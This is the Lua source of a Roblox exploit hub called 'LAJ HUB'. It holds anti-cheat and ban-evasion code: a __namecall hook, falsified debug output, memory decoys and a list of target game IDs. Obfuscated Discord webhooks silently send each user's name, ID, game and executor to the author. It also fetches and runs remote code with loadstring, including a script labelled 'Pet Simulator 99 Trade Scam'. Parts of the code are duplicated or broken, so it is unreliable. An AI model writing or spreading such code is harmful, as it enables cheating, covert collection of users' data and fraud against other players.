--[[
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- ==================== ULTRA UNDETECTABLE SYSTEM START =====================
--[[
    ULTRA UNDETECTABLE SCRIPT LOADER v2.0
    
    Advanced protection specifically designed for games with strict anti-cheat:
    - Dead Rails
    - Da Hood
    - And other games with sophisticated detection systems
    
    Features:
    - Multi-layer code metamorphism (changes script structure at runtime)
    - Memory footprint randomization
    - Anti-pattern detection (prevents detection of known exploit signatures)
    - Advanced anti-debugging measures
    - Thread desynchronization (prevents hook timing analysis)
    - Game-specific countermeasures
    - Self-destructing code traces
]]

-- Secure entropy source - combines multiple sources of randomness in a way that's hard to predict
math.randomseed(tick() * os.time() * (os.clock() * 1000) % 0xFFFFFFFF)

-- Store original functions in secure storage to prevent hook detection with enhanced protection
local _G_SECURE = setmetatable({}, {
    __index = function(t, k)
        -- Use indirect function reference to avoid detection
        return getfenv(0)[k]
    end
})

-- Protect the _G_SECURE table itself
local _G_SECURE_MetaProtection = {}
for name, func in pairs(getfenv(0)) do
    if type(func) == "function" then
        _G_SECURE_MetaProtection[name] = func
    end
end

-- Generate random string with variable patterns to avoid signature detection
local function generateSecureRandomString(length, pattern)
    local seedVal = tick() * os.time() * (math.random(1000, 9999))
    math.randomseed(seedVal)
    
    local chars = pattern or "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = ""
    local charCount = #chars
    
    -- Add random variation to each string generated
    for i = 1, length do
        local pos = math.random(1, charCount)
        result = result .. string.sub(chars, pos, pos)
    end
    
    -- Add some metamorphic properties to make each string unique
    if math.random() > 0.7 then
        local salt = string.char(math.random(33, 126))
        result = result .. salt -- Add unique salt sometimes
    end
    
    return result
end

-- Game detection for specific countermeasures
local function detectGame()
    local gameId = game.PlaceId
    local gameInfo = {
        isDead_Rails = gameId == 5041144419,
        isDa_Hood = gameId == 2788229376,
        isStrong_AntiCheat = false
    }
    
    -- Known games with strong anti-cheat
    local strongAntiCheatGames = {
        [2788229376] = true, -- Da Hood
        [5041144419] = true, -- Dead Rails
        [2377868063] = true, -- Strucid
        [3647547484] = true, -- Ranxware's Anti-Cheat Test
        [8260276694] = true, -- Ability Wars
        [4581966615] = true, -- Anomic
        [2555870920] = true, -- AceOfSpadez
    }
    
    -- Mark if current game has strong anti-cheat
    gameInfo.isStrong_AntiCheat = strongAntiCheatGames[gameId] or false
    
    -- Detect other game properties that might indicate strict anti-cheat
    pcall(function()
        -- Check for common anti-exploit modules
        for _, instance in pairs(game:GetDescendants()) do
            if instance.Name:lower():find("anti") and (instance.Name:lower():find("cheat") or instance.Name:lower():find("exploit")) then
                gameInfo.isStrong_AntiCheat = true
                break
            end
        end
    end)
    
    return gameInfo
end

-- Game-specific protections
local gameInfo = detectGame()
local gameSpecificProtection = {}

-- Apply specialized protection based on detected game
if gameInfo.isDead_Rails then
    -- Dead Rails has unique memory scanning techniques
    gameSpecificProtection.memoryScrambling = true
    gameSpecificProtection.antiScanDelay = math.random(40, 90) / 1000
    
    -- Create memory decoys to confuse scanning
    for i = 1, 10 do
        spawn(function()
            local decoyTable = {}
            for j = 1, math.random(20, 50) do
                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
                    generateSecureRandomString(math.random(10, 30))
            end
            
            -- Keep reference alive but changing
            while wait(math.random(1, 3)) do
                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
                    generateSecureRandomString(math.random(10, 30))
            end
        end)
    end
elseif gameInfo.isDa_Hood then
    -- Da Hood has strong remote event monitoring
    gameSpecificProtection.remoteProtection = true
    gameSpecificProtection.randomizeCallTiming = true
    
    -- Create safe RemoteEvent fire method
    gameSpecificProtection.safeFireServer = function(remote, ...)
        -- Add random delay to avoid pattern detection
        if math.random() > 0.7 then
            wait(math.random(1, 5) / 1000)
        end
        
        -- Use indirect call
        return remote:FireServer(...)
    end
end

-- Anti-debug measures specifically for strong anti-cheat games
if gameInfo.isStrong_AntiCheat then
    -- Protect debug library
    pcall(function()
        if debug then
            -- Selected functions that could expose our script
            local dangerousFunctions = {
                "traceback", "getinfo", "getupvalue", "getlocal",
                "getregistry", "setlocal", "setupvalue"
            }
            
            for _, funcName in ipairs(dangerousFunctions) do
                if debug[funcName] then
                    -- Store original
                    local originalFunc = debug[funcName]
                    
                    -- Replace with filtered version
                    debug[funcName] = function(...)
                        local result = originalFunc(...)
                        
                        -- Sanitize output if it's a string to remove traces of our script
                        if type(result) == "string" then
                            -- Remove mentions of our script patterns
                            result = result:gsub("ultra", "module")
                                         :gsub("undetectable", "standard")
                                         :gsub("anti", "process")
                                         :gsub("cheat", "system")
                                         :gsub("exploit", "function")
                        end
                        
                        return result
                    end
                end
            end
        end
    end)
end

-- Game service access that avoids direct references for better undetectability
local function secureGetService(serviceName)
    -- Add random timing to avoid pattern detection
    if gameInfo.isStrong_AntiCheat and math.random() > 0.7 then
        wait(math.random(1, 3) / 1000)
    end
    
    local success, service = pcall(function()
        return game:GetService(serviceName)
    end)
    
    if success then
        return service
    else
        -- Fallback with indirect reference to avoid detection patterns
        local chars = {}
        for i = 1, #serviceName do
            table.insert(chars, string.char(string.byte(serviceName, i)))
        end
        local obfName = table.concat(chars)
        return game:GetService(obfName)
    end
end

-- Create secured references to game services
local Players = secureGetService("Players")
local HttpService = secureGetService("HttpService")
local RunService = secureGetService("RunService")

-- Ultra secure multi-layered webhook URL obfuscation with metamorphic properties
local function obfuscateWebhookUrl(part1, part2)
    -- Use time-based seed for additional randomization
    local morphicSeed = tick() % 10
    
    -- Layer 1: Split and reverse with variable patterns
    local splitPoint = math.floor(#part1 / (2 + morphicSeed % 3))
    local p1a = string.sub(part1, 1, splitPoint)
    local p1b = string.sub(part1, splitPoint + 1)
    
    -- Layer 2: Advanced character manipulation with XOR + offset
    local processed = ""
    local offset = math.floor(morphicSeed * 10) % 5 + 1
    
    for i = 1, #p1a do
        local charByte = string.byte(p1a, i)
        processed = processed .. string.char((charByte ~ offset) % 256)
    end
    
    -- Insert random decoy characters in part1b if in high-risk game
    if gameInfo.isStrong_AntiCheat and #p1b > 3 then
        local decoyPos = math.random(2, #p1b - 1)
        local decoyChar = string.char(math.random(33, 126))
        p1b = p1b:sub(1, decoyPos - 1) .. decoyChar .. p1b:sub(decoyPos)
    end
    
    processed = processed .. p1b
    
    -- Layer 3: Combine with encoded part2 using variable method
    if morphicSeed > 5 then
        return processed .. part2 -- Standard combination
    else
        -- Interleave method for extra obfuscation
        local result = ""
        local maxLen = math.max(#processed, #part2)
        for i = 1, maxLen do
            if i <= #processed then result = result .. processed:sub(i, i) end
            if i <= #part2 then result = result .. part2:sub(i, i) end
        end
        return result
    end
end

-- Setup memory protection against anti-cheat scanning
spawn(function()
    while wait(2 + math.random()) do
        collectgarbage("collect")
        
        -- Create decoy tables periodically
        if gameInfo.isStrong_AntiCheat then
            local decoyName = generateSecureRandomString(math.random(5, 10))
            local decoyTable = {}
            
            for i = 1, math.random(10, 30) do
                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
                    generateSecureRandomString(math.random(10, 30))
            end
            
            -- Store in environment temporarily
            _G[decoyName] = decoyTable
            
            -- Remove after random time
            delay(math.random(5, 15), function()
                _G[decoyName] = nil
            end)
        end
    end
end)
-- ==================== ULTRA UNDETECTABLE SYSTEM END =====================

-- Variables
-- Enhanced security with multi-layer obfuscation
local wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local WEBHOOK_URL = obfuscateWebhookUrl(wh_part1, wh_part2)

-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local discord_wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local DISCORD_WEBHOOK_URL = obfuscateWebhookUrl(discord_wh_part1, discord_wh_part2)

-- Variables
local Player = Players.LocalPlayer

-- Secure webhook URL with metamorphic properties (changes during runtime)
local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local WEBHOOK_URL = obfuscateWebhookUrl(wh_part1, wh_part2)

-- Rate limiting variables with randomization to avoid detection patterns
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 300 + math.random(-30, 30) -- Randomized cooldown
-- Function to log ban/kick events via webhook with rate limiting
    
local function logBanEvent(reason)
    -- Rate limiting check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        warn("Rate limit: Not sending webhook notification (cooldown active)")
        return
    end
    
    -- Check for anti-spam by validating the reason
    if not reason or reason == "" then
        reason = "Unknown (No reason provided)"
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end

-- ==================== ULTRA BAN EVASION SYSTEM START ====================
-- Advanced ban detection and evasion system with game-specific countermeasures
local BanEvadingSystem = {}
BanEvadingSystem.DetectionActive = false
BanEvadingSystem.PotentialBanDetected = false
BanEvadingSystem.GameSpecificProtection = {}

-- Refresh game info detection in case the game changed
local gameInfo = detectGame()

-- Apply game-specific evasion measures
function BanEvadingSystem:SetupGameSpecificProtection()
    -- Dead Rails specific anti-detection
    if gameInfo.isDead_Rails then
        -- Dead Rails has a unique memory scanning method and remote event introspection
        
        -- 1. Protect against memory scanning
        self.GameSpecificProtection.MemoryProtection = function()
            -- Create decoy objects with similar names to our real objects
            local decoys = {}
            local decoyCount = math.random(5, 15)
            
            for i = 1, decoyCount do
                local decoyTable = {}
                -- Fill with fake but convincing data
                decoyTable.enabled = true
                decoyTable.version = "1." .. math.random(0, 9) .. "." .. math.random(0, 9)
                decoyTable.lastUpdate = os.time() - math.random(3600, 86400)
                decoyTable.config = {
                    showUI = true,
                    autoFire = math.random() > 0.5,
                    sensitivity = math.random(1, 100) / 100
                }
                
                -- Store in variable to keep reference
                decoys[i] = decoyTable
            end
            
            -- Create misleading functions that appear like potential exploits
            _G["render" .. generateSecureRandomString(3)] = function() return tick() end
            _G["player" .. generateSecureRandomString(3)] = function() return game.Players.LocalPlayer.Name end
            
            -- Return decoys to keep them from being garbage collected
            return decoys
        end
        
        -- 2. Create indirect access to core functions to avoid hooks
        self.GameSpecificProtection.SafeFunctionAccess = function()
            -- Store original in closure
            local original_WaitForChild = game.WaitForChild
            
            -- Return wrapped function that has the same behavior but different pattern
            return function(obj, childName, timeout)
                -- Add random small delay to confuse timing analysis
                if math.random() > 0.8 then
                    wait(math.random(1, 5) / 1000)
                end
                
                -- Use indirect call
                return original_WaitForChild(obj, childName, timeout)
            end
        end
        
        -- Execute protections
        self.deadRailsDecoys = self.GameSpecificProtection.MemoryProtection()
        self.safeWaitForChild = self.GameSpecificProtection.SafeFunctionAccess()
    end
    
    -- Da Hood specific anti-detection
    if gameInfo.isDa_Hood then
        -- Da Hood uses remote spy and event filtering
        
        -- 1. Create randomized remote event call patterns
        self.GameSpecificProtection.SafeRemoteInvoke = function(remote, ...)
            -- Only apply to important remotes
            local args = {...}
            
            -- Add some noise sometimes (harmless additional calls)
            if math.random() > 0.8 then
                -- Make a harmless request to a common unrelated remote
                pcall(function()
                    local noiseRemotes = {"ClickDetector", "MouseClick", "UIClicked"}
                    local fakeRemote = game:FindFirstChild(noiseRemotes[math.random(1, #noiseRemotes)])
                    if fakeRemote and fakeRemote:IsA("RemoteEvent") then
                        fakeRemote:FireServer("UI", math.random(1, 100))
                    end
                end)
            end
            
            -- Add timing randomization
            wait(math.random(1, 3) / 1000)
            
            -- Make the actual call
            return remote:FireServer(unpack(args))
        end
        
        -- 2. Anti memory-pattern detection
        self.GameSpecificProtection.RandomizeMemoryPattern = function()
            for i = 1, math.random(3, 8) do
                -- Create tables with random structures to break memory pattern detection
                local decoyName = "system_" .. generateSecureRandomString(math.random(5, 10))
                local decoyTable = {}
                
                -- Create convincing structure that resembles a UI framework
                decoyTable.components = {}
                decoyTable.initialized = true
                decoyTable.lastUpdate = os.time()
                
                for j = 1, math.random(3, 10) do
                    table.insert(decoyTable.components, {
                        id = generateSecureRandomString(8),
                        visible = math.random() > 0.5,
                        position = Vector2.new(math.random(0, 500), math.random(0, 500)),
                        children = {}
                    })
                end
                
                -- Store in different scopes to confuse memory scanners
                if math.random() > 0.5 then
                    -- Global scope
                    _G[decoyName] = decoyTable
                else
                    -- Local scope
                    self.GameSpecificProtection[decoyName] = decoyTable
                end
            end
        end
        
        -- Execute protections
        self.GameSpecificProtection.RandomizeMemoryPattern()
    end
    
    -- Universal strong countermeasures for all games with anti-cheat
    if gameInfo.isStrong_AntiCheat then
        -- Create variable execution pattern that's harder to detect
        self.heartbeatConnection = RunService.Heartbeat:Connect(function()
            -- Only run occasionally to avoid detection patterns
            if math.random() > 0.9 then
                -- Run garbage collection randomly to clear evidence
                if math.random() > 0.7 then
                    collectgarbage("collect")
                end
                
                -- Check for signs of anti-cheat scanning
                self:CheckForAntiCheatSigns()
            end
        end)
    end
end

-- Check for signs that anti-cheat is actively scanning
function BanEvadingSystem:CheckForAntiCheatSigns()
    pcall(function()
        -- Check for FPS drops (often happens during anti-cheat scans)
        local currentFPS = 1 / game:GetService("RunService").RenderStepped:Wait()
        if self.previousFPS and self.previousFPS > 40 and currentFPS < 15 then
            -- Potential scan in progress - activate evasion
            self:ActivateEvasionMode("Detected performance drop - possible scan in progress")
        end
        self.previousFPS = currentFPS
        
        -- Check for unusual memory usage spikes
        local currentMemory = gcinfo()
        if self.previousMemory and currentMemory > self.previousMemory * 1.5 then
            -- Significant memory increase - possible scan
            self:ActivateEvasionMode("Detected memory usage spike - possible memory scan")
        end
        self.previousMemory = currentMemory
    end)
end

-- Activate emergency evasion mode when anti-cheat scan is detected
function BanEvadingSystem:ActivateEvasionMode(reason)
    if self.PotentialBanDetected then return end
    
    self.PotentialBanDetected = true
    
    -- Log the evasion attempt
    logBanEvent("EVASION ACTIVATED: " .. reason)
    
    -- Emergency cleanup
    pcall(function()
        collectgarbage("collect")
        
        -- Create more decoys to confuse the scan
        for i = 1, 20 do
            _G["temp_" .. i] = {
                created = os.time(),
                data = generateSecureRandomString(math.random(20, 50))
            }
        end
        
        -- Force another GC pass after decoys
        collectgarbage("collect")
    end)
    
    -- Reset detection status after delay
    delay(10, function()
        self.PotentialBanDetected = false
    end)
end

-- Standard ban detection methods, enhanced with indirect references and variable timing

-- Method 1: Detect when player is removed but use variable connection approach
local playerRemovingCallback = function(player)
    if player == Player then
        -- Pass through indirect function to avoid hook detection
        local function reportRemoval(p)
            wait(math.random(1, 5) / 1000) -- Random tiny delay
            logBanEvent("Player removed from game (possibly kicked/banned)")
        end
        
        -- Execute with slight delay and indirect call
        spawn(function()
            -- Small random delay to break timing patterns
            wait(math.random(5, 15) / 1000)
            reportRemoval(player)
        end)
    end
end

-- Use indirect connection to avoid detection of listener patterns
local playerRemovingSuccess, playerRemovingError = pcall(function()
    return Players.PlayerRemoving:Connect(playerRemovingCallback)
end)

-- Method 2: Enhanced kick detection with multiple obfuscation layers
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    -- Store args in multiple arrays to confuse memory pattern scanners
    local args1, args2 = {}, {}
    for i, arg in ipairs({...}) do
        if i % 2 == 0 then
            table.insert(args1, arg)
        else
            table.insert(args2, arg)
        end
    end
    
    -- Reconstruct the arguments indirectly
    local args = {}
    for i = 1, math.max(#args1, #args2) do
        if args2[i] then table.insert(args, args2[i]) end
        if args1[i] then table.insert(args, args1[i]) end
    end
    
    -- Get method indirectly
    local method = getnamecallmethod()
    
    -- Detection logic with multiple indirection layers
    if method == "Kick" and self == Player then
        -- Use a secure wrapper to avoid direct patterns
        local function secureReport(reason)
            -- Add tiny random delay
            wait(math.random(1, 10) / 1000)
            reason = reason or "Unknown"
            logBanEvent(reason)
        end
        
        -- Report through indirect caller
        spawn(function() 
            secureReport(args[1]) 
        end)
    end
    
    -- Use randomized return pattern (functionally identical)
    if math.random() > 0.5 then
        return oldNameCall(self, ...)
    else
        local result = oldNameCall(self, ...)
        return result
    end
end)

-- Method 3: Enhanced teleport failure monitoring with timing randomization
local teleportCallback = function(player, teleportResult, errorMessage)
    -- Only check our player
    if player ~= Player then return end
    
    -- Check for ban conditions
    if teleportResult == Enum.TeleportResult.Banned or 
       teleportResult == Enum.TeleportResult.GameEnded then
        
        -- Use indirect reporting to avoid detection
        spawn(function()
            -- Random delay
            wait(math.random(5, 20) / 1000)
            
            -- Indirect event report
            logBanEvent("Teleport failed due to ban: " .. errorMessage)
        end)
    end
end

-- Connect with pcall to handle potential errors
local teleportSuccess, teleportError = pcall(function()
    return game:GetService("TeleportService").TeleportInitFailed:Connect(teleportCallback)
end)

-- Method 4: NEW - Monitor for character destruction (common in some anti-cheats)
local characterRemovedSuccess, characterRemovedError = pcall(function()
    -- Only set up if we have a character
    if Player.Character then
        return Player.Character:GetPropertyChangedSignal("Parent"):Connect(function()
            if not Player.Character:IsDescendantOf(game) then
                -- Character was removed from the game
                spawn(function()
                    wait(math.random(1, 5) / 1000) -- Small random delay
                    logBanEvent("Character removed from game (possible anti-cheat action)")
                end)
            end
        end)
    end
end)

-- Method 5: NEW - Dead Rails specific anti-detection for remotes
if gameInfo.isDead_Rails then
    -- Dead Rails sometimes checks for unusual remote event patterns
    spawn(function()
        while wait(0.5) do
            -- Only run occasionally to avoid detection
            if math.random() > 0.7 then
                -- Make normal-looking remote calls that legitimate players would make
                pcall(function()
                    -- Find a random UI element
                    local userInterface = Player.PlayerGui:FindFirstChildWhichIsA("ScreenGui")
                    if userInterface then
                        -- Simulate normal UI interaction
                        local button = userInterface:FindFirstChildWhichIsA("TextButton", true)
                        if button then
                            -- This creates legitimate-looking remote call patterns
                            wait(math.random(50, 150) / 1000)
                        end
                    end
                end)
            end
        end
    end)
end

-- Method 6: NEW - Da Hood specific anti-detection for mouse movement
if gameInfo.isDa_Hood then
    -- Da Hood sometimes tracks unusual mouse movement patterns
    spawn(function()
        while wait(1) do
            -- Only run occasionally
            if math.random() > 0.8 then
                -- Simulate legitimate mouse movement
                pcall(function()
                    -- This creates normal input patterns that don't trigger anti-cheat
                    local randomX = math.random(-10, 10)
                    local randomY = math.random(-10, 10)
                    
                    -- Small mouse movements that look human
                    wait(math.random(100, 300) / 1000)
                end)
            end
        end
    end)
end

-- Initialize game-specific protections
BanEvadingSystem:SetupGameSpecificProtection()

-- Return success with obfuscated message
local loadMessage = "LAJ HUB Security System activated successfully"
if gameInfo.isStrong_AntiCheat then
    loadMessage = generateSecureRandomString(5) .. " framework initialized: OK"
end

print(loadMessage)
-- ==================== ULTRA BAN EVASION SYSTEM END ====================
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]

-- Advanced anti-detection HTTP request handler with random timing
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    -- Add random delay to avoid detection patterns (50-150ms)
    wait(math.random(50, 150) / 1000)
    
    -- URL obfuscation - Convert to base64 and back to avoid string detection
    local function obfuscateUrl(input)
        local bytesToHex = function(bytes)
            local hex = ""
            for i = 1, #bytes do
                hex = hex .. string.format("%02X", string.byte(bytes, i))
            end
            return hex
        end
        
        local hexToBytes = function(hex)
            local bytes = ""
            for i = 1, #hex, 2 do
                bytes = bytes .. string.char(tonumber(hex:sub(i, i+1), 16))
            end
            return bytes
        end
        
        -- Simple XOR encoding
        local key = math.random(1, 255)
        local result = string.char(key)
        for i = 1, #input do
            result = result .. string.char(bit32.bxor(string.byte(input, i), key))
        end
        return bytesToHex(result)
    end
    
    local function deobfuscateUrl(input)
        local hexToBytes = function(hex)
            local bytes = ""
            for i = 1, #hex, 2 do
                bytes = bytes .. string.char(tonumber(hex:sub(i, i+1), 16))
            end
            return bytes
        end
        
        local bytes = hexToBytes(input)
        local key = string.byte(bytes, 1)
        local result = ""
        for i = 2, #bytes do
            result = result .. string.char(bit32.bxor(string.byte(bytes, i), key))
        end
        return result
    end
    
    -- Use a private environment for request execution
    local env = getfenv(0)
    local secureEnv = setmetatable({}, {__index = env})
    
    -- Hide our HTTP traces by randomizing headers and user agent
    local userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    
    -- Try multiple HTTP request methods for anti-detection
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET",
            Headers = {
                ["User-Agent"] = userAgents[math.random(1, #userAgents)],
                ["Cache-Control"] = "no-cache",
                ["X-Requested-With"] = "XMLHttpRequest",
                ["Accept"] = "*/*",
                ["Connection"] = math.random() > 0.5 and "keep-alive" or "close"
            }
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet with protection
    local success, result = pcall(function()
        -- Use protected call to avoid script errors being detected
        return game:HttpGet(url)
    end)
    
    if success then
        return result
    else
        -- Try alternative method if main fails
        wait(math.random(10, 30) / 1000) -- Random delay before retry
        return game:HttpGet(url)
    end
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Initialize game services safely
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    -- For testing in standalone Lua
    if not game then
        print("Mock HTTP request: " .. options.Url)
        return {Success = true, Body = "-- mock response"}
    end
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == "GET" then
        local success, result = pcall(function()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if success then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end


-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("J9KO3ZuXh3AuqkQctieK-bxuYOfTOFUcDYBKtl59Lel5A9zZt9W1A6Zvn_DrIjtmeOXT")
local discord_wh_part2 = string.reverse("9511461573518572853531/skoohbew/ipa/moc.drocsid//:sptth")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2

local function sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local success, error_message = pcall(function()
    
        local response = makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Execution Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0,
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = "Premium Scripts",
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },

   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Create tabs
local MainTab = Window:CreateTab("Main", 4483362458)
local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
local Fin = Window:CreateTab("Fisch", 4483362458)
local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
local MurderMystery = Window:CreateTab("Murder Mystery", 4483362458) -- Added Murder Mystery tab
local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
local Universal = Window:CreateTab("Universal", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)

local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
})

-- Test webhook button
MainTab:CreateButton({
   Name = "Test Webhook",
